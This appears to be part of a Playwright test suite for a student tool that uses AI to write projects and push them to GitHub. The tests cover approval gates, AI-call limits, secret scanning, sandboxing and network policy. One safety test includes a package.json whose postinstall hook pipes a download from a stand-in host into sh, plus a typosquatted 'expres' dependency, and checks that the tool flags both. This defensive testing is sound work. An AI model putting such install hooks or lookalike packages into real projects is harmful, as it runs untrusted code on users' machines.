  ok((await page.textContent("#ideaMsg")).includes("today's free Groq limit"), "rate limit (per day): plain-words message, no waiting");
  groqPlan = [{ text: good.slice(0, 120), finish: "length" }];
  await page.click("#planWrite"); await page.waitForTimeout(600);
  ok((await page.textContent("#ideaMsg")).includes("cut off"), "cut-off reply: explained instead of a half project");
  await page.click("#planCancel");

  // ---- 9e2. Ship it for me: plan → approve → write → check → AI fix → safety → push, within limits
  const withIgnore = t => t.replace("=== COMMIT: Add README ===", "=== FILE: .gitignore ===\n__pycache__/\n=== COMMIT: Add README ===");
  const shipGood = withIgnore(good.replace("todo-cli", "auto-todo"));
  const shipPlan = PLAN.replace("todo-cli", "auto-todo");
  await page.fill("#ideaText", "A Python command-line to-do app with tests");
  await page.click("#autoGo");
  ok(await page.isVisible("#autoBox") && await page.isChecked("#autoPrivate"), "ship it for me: limits first, private repo by default");
  groqCalls = []; pyRuns = 0;
  groqPlan = [{ text: shipPlan }, { text: shipGood }, { text: fixed }];
  pyPlan = [{ status: "fail", output: "FAILED test_todo.py::test_add" }, { status: "pass", output: "1 passed" }];
  await page.click("#autoStart");
  await page.waitForFunction(() => /Waiting for you/.test(document.querySelector("#autoLog").textContent), null, { timeout: 8000 });
  ok(await page.isVisible("#planBox") && (await page.textContent("#planWrite")) === "Approve and ship it" && groqCalls.length === 1, "ship it for me: pauses for the student to approve the plan");
  await page.click("#planWrite");
  await page.waitForFunction(() => !document.querySelector("#autoSummary").hidden, null, { timeout: 20000 });
  const autoLog = await page.textContent("#autoLog"), summary = await page.textContent("#autoSummary");
  ok(/Plan approved/.test(autoLog) && /AI fix 1 applied/.test(autoLog) && /Tests pass after 1 AI fix/.test(autoLog) && /No secrets or warnings/.test(autoLog) && /Pushed to aadvik\/auto-todo/.test(autoLog), "ship it for me: live step list through write, check, fix, safety and push");
  ok(repos["aadvik/auto-todo"] && lastCreate.private === true && hist(repos["aadvik/auto-todo"]).length === 3, "ship it for me: pushed to a new private repo with the planned commits");
  ok(/Shipped\./.test(summary) && /3 commits/.test(summary) && /3 AI calls/.test(summary) && /github\.com\/aadvik\/auto-todo/.test(summary), "ship it for me: summary with files, commits, check, AI calls and the repo link");

  // limits: a fix would exceed 2 AI calls → stops, nothing pushed
  await page.fill("#ideaText", "A Python command-line to-do app with tests");
  await page.fill("#autoCalls", "2");
  groqPlan = [{ text: PLAN.replace("todo-cli", "limit-todo") }, { text: withIgnore(good.replace("todo-cli", "limit-todo")) }, { text: fixed }];
  pyPlan = [{ status: "fail", output: "FAILED" }];
  await page.click("#autoStart");
  await page.waitForFunction(() => /Waiting for you/.test(document.querySelector("#autoLog").textContent), null, { timeout: 8000 });
  await page.click("#planWrite");
  await page.waitForFunction(() => /limit of 2 AI calls/.test(document.querySelector("#autoLog").textContent), null, { timeout: 15000 });
  ok(!repos["aadvik/limit-todo"] && (await page.textContent("#autoSummary")).includes("Not pushed"), "ship it for me: the AI-call limit stops it before pushing");

  // safety: a secret in the written project stops it, nothing pushed
  await page.fill("#autoCalls", "10");
  groqPlan = [{ text: PLAN.replace("todo-cli", "leaky") }, { text: withIgnore(good.replace("todo-cli", "leaky").replace("import json", 'TOKEN = "ghp_' + "z".repeat(36) + '"')) }];
  pyPlan = [{ status: "pass" }];
  await page.click("#autoStart");
  await page.waitForFunction(() => /Waiting for you/.test(document.querySelector("#autoLog").textContent), null, { timeout: 8000 });
  await page.click("#planWrite");
  await page.waitForFunction(() => /nothing was pushed/.test(document.querySelector("#autoLog").textContent), null, { timeout: 15000 });
  ok(!repos["aadvik/leaky"] && (await page.textContent("#autoLog")).includes("Blocked"), "ship it for me: never pushes when a secret is found");

  // Stop while it waits for approval
  groqPlan = [{ text: PLAN }];
  await page.click("#autoStart");
  await page.waitForFunction(() => /Waiting for you/.test(document.querySelector("#autoLog").textContent), null, { timeout: 8000 });
  await page.click("#autoStop");
  await page.waitForFunction(() => /Stopped/.test(document.querySelector("#autoLog").textContent), null, { timeout: 5000 });
  ok(await page.isVisible("#autoStart") && (await page.textContent("#planWrite")) === "Approve and write the files", "ship it for me: Stop ends it cleanly");
  await page.click("#autoCancel"); await page.click("#planCancel");

  // ---- 9f. change it with AI: only the changed files come back, as a new commit with a diff
  await page.fill("#manifest", good); await page.waitForTimeout(300);
  groqCalls = []; groqPlan = [{ text: "=== FILE: todo.py ===\nimport json\n\ndef add(items, text):\n    items.append(text)\n    return items\n\ndef remove(items, text):\n    return [i for i in items if i != text]\n=== COMMIT: Add a remove command ===" }];
  await page.fill("#chatText", "add a command to remove a task");
  await page.press("#chatText", "Enter");
  await page.waitForFunction(() => /Done:/.test(document.querySelector("#aiToolMsg").textContent), null, { timeout: 8000 });
  ok(/add a command to remove a task/.test(groqCalls[0].messages[1].content) && /--- todo\.py ---/.test(groqCalls[0].messages[1].content), "change: the request and the project's code go to the AI");
  ok(await page.evaluate(() => window.__steject.S.m.commits.length) === 4 && (await page.textContent("#commits")).includes("Add a remove command"), "change: added as a new commit");
  ok((await page.getAttribute("#vDiff", "aria-pressed")) === "true" && (await page.textContent("#vMeta")).startsWith("+"), "change: the diff opens on the changed file");
  ok((await page.textContent("#checks")).includes("Last AI change") && (await page.textContent("#aiToolMsg")).includes("changed 1 file"), "change: Inspect summarises what changed");

  // ---- 9f2. checkpoints: saved before the AI change, restored in one click
  await page.click("#cpBox summary");
  await page.waitForFunction(() => /Before: "add a command/.test(document.querySelector("#cpList").textContent), null, { timeout: 5000 });
  ok(+(await page.textContent("#cpCount")) >= 2, "checkpoints: saved before AI changes (count shown)");
  const cpId = await page.evaluate(() => [...document.querySelectorAll("#cpList li")].find(li => /Before: "add a command/.test(li.textContent)).querySelector("[data-cp]").dataset.cp);
  await page.click(`[data-cp="${cpId}"]`);
  await page.waitForTimeout(300);
  ok(await page.evaluate(() => window.__steject.S.m.commits.length) === 3 && (await page.textContent("#cpList")).includes("Before restoring a checkpoint"), "checkpoints: restore brings back the earlier version, and the replaced one is kept");
  await page.click("#undoBtn"); await page.waitForTimeout(300);
  ok(await page.evaluate(() => window.__steject.S.m.commits.length) === 4, "checkpoints: Undo after a restore goes back again");

  // ---- 9g. repo polish pack
  await page.click("#polishBox summary");
  await page.check("#plCi"); await page.check("#plAgents"); await page.check("#plIssues");
  await page.click("#plAdd");
  const polished = await page.evaluate(() => [...window.__steject.S.m.commits.at(-1).files.keys()].sort().join(","));
  ok(polished === ".github/ISSUE_TEMPLATE/bug_report.md,.github/ISSUE_TEMPLATE/feature_request.md,.github/workflows/ci.yml,.gitignore,AGENTS.md,CLAUDE.md,LICENSE", "polish: LICENSE, .gitignore, issue templates, CI, AGENTS.md and CLAUDE.md added as one commit");
  ok((await page.evaluate(() => window.__steject.S.m.commits.at(-1).files.get("LICENSE"))).includes("aadvik"), "polish: LICENSE has the GitHub name");

  // ---- 9h. understanding gate: quiz to pass it, score into the README
  await page.click('nav [data-go="learn"]');
  await page.check("#gateOn");
  await page.click('nav [data-go="ship"]');
  ok(await page.isDisabled("#pushBtn") && (await page.textContent("#shipMsg")).includes("understanding gate") && await page.isVisible("#gateBox"), "gate: push blocked until the student passes");
  await page.click('nav [data-go="learn"]');
  groqPlan = [{ text: JSON.stringify({ questions: [0, 1, 2, 3, 4].map(i => ({ q: "Q" + i, options: ["right", "wrong"], answer: 0, why: "because" })) }) }];
  await page.click("#lQuiz");
  await page.waitForSelector(".q", { timeout: 8000 });
  for (let i = 0; i < 5; i++) await page.click(`.q[data-q="${i}"] button[data-o="${i < 4 ? 0 : 1}"]`);
  ok((await page.textContent("#quizScore")).includes("4/5") && (await page.textContent("#gateNote")).includes("passed"), "gate: 4/5 on the quiz passes");
  await page.click('nav [data-go="ship"]');
  ok(!(await page.isDisabled("#pushBtn")) && (await page.textContent("#gateBox")).includes("4/5"), "gate: push allowed after passing");
  await page.click("#scoreAdd");
  const readme = await page.evaluate(() => window.__steject.S.m.commits.at(-1).files.get("README.md"));
  ok(/## Understanding check[\s\S]*@aadvik[\s\S]*\*\*4\/5\*\*/.test(readme) && !(await page.isDisabled("#pushBtn")), "gate: score added to the README, still passed");
  await page.click('nav [data-go="learn"]'); await page.uncheck("#gateOn");

  // ---- 9i. mock interview
  const turn = (q, score, done) => ({ text: JSON.stringify({ feedback: score == null ? "" : "Good.", score, question: q, done: !!done }) });
  groqPlan = [turn("What does add() return?", null), turn("Q2?", 2), turn("Q3?", 1), turn("Q4?", 2), turn("Q5?", 2), turn("", 2, true)];
  await page.click("#lInterview");
  await page.waitForSelector("#ivAnswer", { timeout: 8000 });
  ok((await page.textContent("#learnOut")).includes("What does add() return?"), "interview: asks about this project");
  for (let i = 0; i < 5; i++) { await page.fill("#ivAnswer", "My answer " + i); await page.click("#ivSend"); await page.waitForFunction(n => document.querySelectorAll(".iv .me").length === n && !document.querySelector(".thinking"), i + 1, { timeout: 8000 }); }
  ok((await page.textContent("#learnOut")).includes("9/10") && (await page.textContent("#learnOut")).includes("Passed"), "interview: 5 questions, scored 9/10, passed");
  await shot({ path: `${OUT}/12-interview.png`, fullPage: true });

  // ---- 9j. web project: check in the sandbox, live preview tab
  await page.click('nav [data-go="ship"]');
  await page.fill("#manifest", "=== PROJECT: tip ===\n=== FILE: index.html ===\n<html><body><h1 id=t>Tip</h1><script src=\"app.js\"></script></body></html>\n=== FILE: app.js ===\nconsole.error('total is NaN');\n=== COMMIT: Add page ===");
  await page.waitForTimeout(300);
  await page.click("#runCheck");
  await page.waitForFunction(() => /error/.test(document.querySelector("#runMsg").textContent), null, { timeout: 15000 });
  ok((await page.textContent("#runMsg")).includes("1 error on the page") && (await page.textContent("#runOut")).includes("total is NaN"), "web check: page errors are caught in the sandbox");
  ok(await page.isVisible("#runFix"), "web check: Fix with AI offered");
  await page.click("#vPrev");
  await page.waitForSelector("#code iframe.preview", { timeout: 5000 });
  const sandbox = await page.getAttribute("#code iframe.preview", "sandbox");
  ok(sandbox === "allow-scripts allow-forms", "preview: sandboxed frame (no same-origin access)");
  await page.waitForTimeout(800);
  ok((await page.frameLocator("#code iframe.preview").locator("#t").textContent()) === "Tip", "preview: the project's page renders");
  await page.fill("#manifest", '=== FILE: package.json ===\n{"scripts":{"test":"jest"}}\n=== COMMIT: x ===');
  await page.waitForTimeout(300); await page.click("#runCheck"); await page.waitForTimeout(400);
  ok((await page.textContent("#runMsg")).includes("Can't run here"), "Node projects: honest 'can't run here' instead of a fake pass");

  // ---- 9k. open an existing project: GitHub repo (own repo → Update mode), then a pull request
  await page.click("#ghImportBtn");
  await page.fill("#importRepo", "aadvik/busy-app");
  await page.click("#importGo");
  await page.waitForFunction(() => window.__steject.S.imported === "github", null, { timeout: 8000 });
  await page.waitForFunction(() => /vs GitHub/.test(document.querySelector("#checks").textContent), null, { timeout: 8000 });
  ok((await page.getAttribute("#modeUpd", "aria-pressed")) === "true" && (await page.inputValue("#repoPick")) === "aadvik/busy-app", "import: own repo opens in Update mode");
  ok((await page.textContent("#checks")).includes("0 new · 0 changed"), "import: files match GitHub exactly");
  groqPlan = [{ text: "=== FILE: utils.py ===\ndef f():\n    return 2\n=== COMMIT: Return 2 from f ===" }];
  await page.fill("#chatText", "make f return 2"); await page.click("#chatGo");
  await page.waitForFunction(() => /Done:/.test(document.querySelector("#aiToolMsg").textContent), null, { timeout: 8000 });
  await page.check("#prOn");
  ok((await page.inputValue("#prBranch")) === "steject/return-2-from-f" && (await page.textContent("#pushBtn")).includes("pull request"), "PR mode: branch name and title filled in");
  const mainBefore = repos["aadvik/busy-app"].ref;
  await page.click("#pushBtn");
  await page.waitForSelector("#doneBox:not([hidden])", { timeout: 15000 });
  r = repos["aadvik/busy-app"];
  ok(r.ref === mainBefore && r.branches && r.branches["steject/return-2-from-f"], "PR mode: main untouched, commits on a new branch");
  ok(prs.length === 1 && prs[0].base === "main" && prs[0].head === "steject/return-2-from-f" && (await page.textContent("#doneBox")).includes("Pull request #1"), "PR mode: pull request opened into main");
  await page.click("#pushBtn");
  await page.waitForTimeout(800);
  ok((await page.textContent("#log")).includes("already exists"), "PR mode: an existing branch name gets a clear error");
  await page.uncheck("#prOn"); await page.click("#modeNew");

  // ---- 9l. open a local folder: build folders and binaries are left out
  const os = require("os");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "ste-")), projDir = path.join(dir, "MyGame");
  fs.mkdirSync(path.join(projDir, "src"), { recursive: true }); fs.mkdirSync(path.join(projDir, "node_modules", "x"), { recursive: true });
  fs.writeFileSync(path.join(projDir, "src", "game.js"), "export const go = () => 1;\n");
  fs.writeFileSync(path.join(projDir, "README.md"), "# My game\n");
  fs.writeFileSync(path.join(projDir, "node_modules", "x", "index.js"), "module.exports = 1;\n");
  fs.writeFileSync(path.join(projDir, "logo.png"), Buffer.from([137, 80, 78, 71, 0, 0]));
  await page.setInputFiles("#dirIn", projDir);
  await page.waitForFunction(() => window.__steject.S.imported === "folder", null, { timeout: 5000 });
  const opened = await page.evaluate(() => [...window.SteCore.finalFiles(window.__steject.S.m).keys()].sort().join(","));
  ok(opened === "README.md,src/game.js" && (await page.textContent("#projName")).includes("mygame"), "folder: text files opened, node_modules and images left out");

  // ---- 9m. workflow files without the workflow scope: clear message
  noWorkflowScope = true;
  await page.fill("#manifest", "=== PROJECT: ci-demo ===\n=== FILE: a.py ===\nx = 1\n=== FILE: .github/workflows/ci.yml ===\nname: CI\n=== COMMIT: Add CI ===");
  await page.waitForTimeout(300);
  await page.click("#pushBtn");
  await page.waitForFunction(() => /workflow/.test(document.querySelector("#log").textContent), null, { timeout: 15000 });
  ok((await page.textContent("#log")).includes("workflow scopes"), "CI file without the workflow scope: explains the token scope");
  noWorkflowScope = false;

  // ---- 9n. Learn through Groq, then remove the key
  await page.fill("#manifest", good);
  await page.waitForTimeout(300);
  groqCalls = []; groqPlan = [{ text: "## What it does\nAdds items.\n\n```py\nitems.append(text)\n```" }];
  await page.click('nav [data-go="learn"]');
  await page.click("#lExplain");
  await page.waitForSelector("#learnOut .prose h2", { timeout: 8000 });
  ok(groqCalls.length === 1 && (await page.textContent("#learnOut")).includes("What it does"), "Learn works through Groq");
  ok(/Groq: \d+ requests/.test(await page.evaluate(() => { window.__steject.go("settings"); return document.querySelector("#usageLine").textContent; })), "usage counter counts Groq requests");
  await page.click("#chipAi"); await page.click("#groqRemove");
  ok((await page.textContent("#chipAi")) === "AI: off" && !(await page.evaluate(() => localStorage.getItem("steject.secret.groqKey"))), "removing the Groq key turns AI off and deletes it");

  // ---- 9o. any OpenAI-style provider, with a usage counter
  await page.click("#provCustom");
  await page.fill("#customUrl", "http://evil.example/v1"); await page.click("#customSave");
  ok((await page.textContent("#customMsg")).includes("https://"), "custom: plain http to another computer is refused");
  await page.fill("#customUrl", "https://ai.example.test/v1/"); await page.fill("#customKey", "sk-test-123");
  await page.click("#customSave"); await page.waitForTimeout(400);
  ok((await page.textContent("#customMsg")).includes("2 models"), "custom: lists the service's models");
  await page.fill("#customModel", "tiny-coder"); await page.dispatchEvent("#customModel", "change");
  ok((await page.textContent("#chipAi")) === "AI: ai.example.test", "custom: chip shows the service");
  await page.click('nav [data-go="learn"]'); await page.click("#lExplain");
  await page.waitForFunction(() => /custom provider/.test(document.querySelector("#learnOut").textContent), null, { timeout: 8000 });
  ok(customCalls.length === 1 && customCalls[0].auth === "Bearer sk-test-123" && customCalls[0].body.model === "tiny-coder", "custom: Learn runs through the custom address with its key and model");
  await page.evaluate(() => window.__steject.go("settings"));
  await page.fill("#usageLimit", "2");
  ok(/1 request · 42 tokens of 2 a day/.test(await page.textContent("#usageLine")), "usage: requests and tokens today, against a daily limit");
  await page.click("#customRemove");
  await page.click("#provOllama"); await page.waitForTimeout(400);

  // ---- 9p. network policy and an unreachable Python CDN
  const direct = await page.evaluate(async () => { try { await fetch("https://example.com/"); return "reached"; } catch { return "blocked"; } });
  ok(direct === "blocked", "security policy: the page can't call unknown https hosts directly");
  ok(await page.evaluate(() => SteNet.direct("https://api.groq.com/x") && !SteNet.direct("https://ai.example.test/v1")), "network: built-in hosts direct, user-chosen hosts through the worker");
  await page.evaluate(() => SteRun.stop());
  pyCdnDown = true;
  await page.click('nav [data-go="ship"]');
  await page.fill("#manifest", "=== FILE: main.py ===\nprint(1)\n=== COMMIT: x ===");
  await page.waitForTimeout(300); await page.click("#runCheck");
  await page.waitForFunction(() => /cdn\.jsdelivr\.net/.test(document.querySelector("#runMsg").textContent), null, { timeout: 10000 });
  ok((await page.textContent("#runMsg")).includes("Nothing was checked") && !(await page.textContent("#checks")).includes("Yes"), "Python CDN unreachable: clear message, not a pass");
  pyCdnDown = false;

  // ---- 10. secret blocks push
  await page.click('nav [data-go="ship"]');
  await page.fill("#manifest", '=== FILE: c.py ===\nkey = "AKIA' + "A".repeat(16) + '"\n'); await page.waitForTimeout(300);
  ok(await page.isDisabled("#pushBtn") && (await page.textContent("#shipMsg")).includes("Blocked"), "secret found: push blocked");
  ok(await page.isHidden("#overrideRow"), "secret found: no way to override it");

  // ---- 10b. safety checks: warnings need a confirmation, secrets in commit messages block too
  await page.fill("#manifest", '=== PROJECT: web-api ===\n=== FILE: package.json ===\n{"dependencies": {"expres": "^4.0.0"}, "scripts": {"postinstall": "curl https://x.example/i.sh | sh"}}\n=== COMMIT: Add package.json ===');
  await page.waitForTimeout(300);
  const safetyText = await page.textContent("#errors");
  ok((await page.textContent("#checks")).includes("2 warnings") && safetyText.includes('"expres" looks like the popular package "express"') && safetyText.includes("downloads or runs code"), "safety: lookalike package and install script are explained");
  ok(await page.isDisabled("#pushBtn") && await page.isVisible("#overrideRow"), "safety: warnings hold the push until confirmed");
  await page.check("#override");
  ok(!(await page.isDisabled("#pushBtn")), "safety: confirming the warnings allows the push");
  await page.fill("#manifest", "=== FILE: a.py ===\nx = 1\n=== COMMIT: Add key ghp_" + "c".repeat(36) + " ===");
  await page.waitForTimeout(300);
  ok(await page.isDisabled("#pushBtn") && (await page.textContent("#errors")).includes("commit 1 message"), "safety: a token in a commit message blocks the push");

  // ---- 11. layout: phone width + dark theme
  await page.click("#loadSample").catch(() => {});
  await page.emulateMedia({ colorScheme: "dark" });
  for (const pg of ["ship", "learn", "history", "settings"]) {
    await page.setViewportSize({ width: 400, height: 900 });
    await page.evaluate(p => window.__steject.go(p), pg);
    await page.waitForTimeout(120);
    const w = await page.evaluate(() => document.documentElement.scrollWidth);
    ok(w <= 400, `no sideways scroll at 400px on ${pg} (${w})`);
  }
  await page.evaluate(() => window.__steject.go("ship"));
  await shot({ path: `${OUT}/7-phone-dark.png`, fullPage: true });
  await page.setViewportSize({ width: 1360, height: 1000 });
  await shot({ path: `${OUT}/8-desktop-dark.png`, fullPage: true });

  ok(errors.length === 0, "no page errors" + (errors.length ? ": " + errors.join(" | ") : ""));
  await browser.close(); server.close();
  console.log(failures ? `\n${failures} FAILED` : "\nall passed");
  process.exit(failures ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
